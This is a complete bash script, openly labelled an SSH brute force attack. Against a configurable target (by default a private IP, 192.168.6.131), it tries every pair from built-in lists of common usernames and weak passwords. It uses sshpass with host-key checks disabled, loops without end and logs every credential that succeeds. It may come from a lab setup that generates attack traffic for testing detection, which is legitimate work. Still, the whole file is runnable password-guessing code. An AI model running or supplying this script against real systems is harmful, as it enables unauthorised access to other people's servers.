#!/bin/bash
# SSH Brute Force Attack Script
# Attempts to login to SSH server with common credentials

set -e

TARGET_IP="${TARGET_IP:-192.168.6.131}"
TARGET_PORT="${TARGET_PORT:-22}"
ATTACK_INTERVAL="${ATTACK_INTERVAL:-5}"
LOG_INTERVAL="${LOG_INTERVAL:-5}"

LOG_FILE="/app/logs/ssh_attacks_$(date +%Y%m%d_%H%M%S).log"
SUMMARY_LOG="/app/logs/ssh_summary.log"

# Common usernames and passwords for brute force
USERNAMES=("root" "admin" "user" "test" "ubuntu" "debian" "pi" "administrator" "guest")
PASSWORDS=("password" "123456" "admin" "root" "toor" "test" "12345678" "qwerty" "password123" "letmein")

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Initialize logs
echo "==================================================" | tee -a "$LOG_FILE"
echo "SSH Brute Force Attack Started: $(date)" | tee -a "$LOG_FILE"
echo "Target: ${TARGET_IP}:${TARGET_PORT}" | tee -a "$LOG_FILE"
echo "Attack Interval: ${ATTACK_INTERVAL} seconds" | tee -a "$LOG_FILE"
echo "Log Dump Interval: ${LOG_INTERVAL} seconds" | tee -a "$LOG_FILE"
echo "==================================================" | tee -a "$LOG_FILE"
echo ""

# Initialize counters
TOTAL_ATTEMPTS=0
FAILED_ATTEMPTS=0
SUCCESS_ATTEMPTS=0
LAST_DUMP_TIME=$(date +%s)

# Function to dump logs
dump_logs() {
    local current_time=$(date +%s)
    local elapsed=$((current_time - LAST_DUMP_TIME))
    
    if [ $elapsed -ge $LOG_INTERVAL ]; then
        echo "" | tee -a "$LOG_FILE"
        echo "==================================================" | tee -a "$LOG_FILE"
        echo -e "${BLUE}[LOG DUMP $(date)]${NC}" | tee -a "$LOG_FILE"
        echo "Total Attempts: ${TOTAL_ATTEMPTS}" | tee -a "$LOG_FILE"
        echo "Failed Attempts: ${FAILED_ATTEMPTS}" | tee -a "$LOG_FILE"
        echo "Success Attempts: ${SUCCESS_ATTEMPTS}" | tee -a "$LOG_FILE"
        echo "==================================================" | tee -a "$LOG_FILE"
        echo "" | tee -a "$LOG_FILE"
        
        # Update summary log
        echo "[$(date)] Total: ${TOTAL_ATTEMPTS}, Failed: ${FAILED_ATTEMPTS}, Success: ${SUCCESS_ATTEMPTS}" >> "$SUMMARY_LOG"
        
        LAST_DUMP_TIME=$current_time
    fi
}

# Function to attempt SSH login
attempt_ssh_login() {
    local username=$1
    local password=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    
    TOTAL_ATTEMPTS=$((TOTAL_ATTEMPTS + 1))
    
    echo -e "${YELLOW}[${timestamp}] Attempting login: ${username}:${password}${NC}" | tee -a "$LOG_FILE"
    
    # Attempt SSH connection with timeout
    if sshpass -p "$password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o UserKnownHostsFile=/dev/null -p "$TARGET_PORT" "${username}@${TARGET_IP}" "echo 'Access Granted'" 2>/dev/null; then
        echo -e "${GREEN}[${timestamp}] ✓ SUCCESS! Credentials work: ${username}:${password}${NC}" | tee -a "$LOG_FILE"
        SUCCESS_ATTEMPTS=$((SUCCESS_ATTEMPTS + 1))
        echo "[ALERT] Successful login: ${username}:${password} at ${timestamp}" >> "$SUMMARY_LOG"
    else
        echo -e "${RED}[${timestamp}] ✗ FAILED: ${username}:${password}${NC}" | tee -a "$LOG_FILE"
        FAILED_ATTEMPTS=$((FAILED_ATTEMPTS + 1))
    fi
    
    # Check if it's time to dump logs
    dump_logs
}

# Main attack loop
echo -e "${BLUE}Starting continuous SSH brute force attack...${NC}"
echo ""

while true; do
    # Try each username/password combination
    for username in "${USERNAMES[@]}"; do
        for password in "${PASSWORDS[@]}"; do
            attempt_ssh_login "$username" "$password"
            
            # Wait between attempts
            sleep "$ATTACK_INTERVAL"
        done
    done
    
    echo ""
    echo -e "${YELLOW}Completed one full round of attacks. Starting next round...${NC}"
    echo ""
done
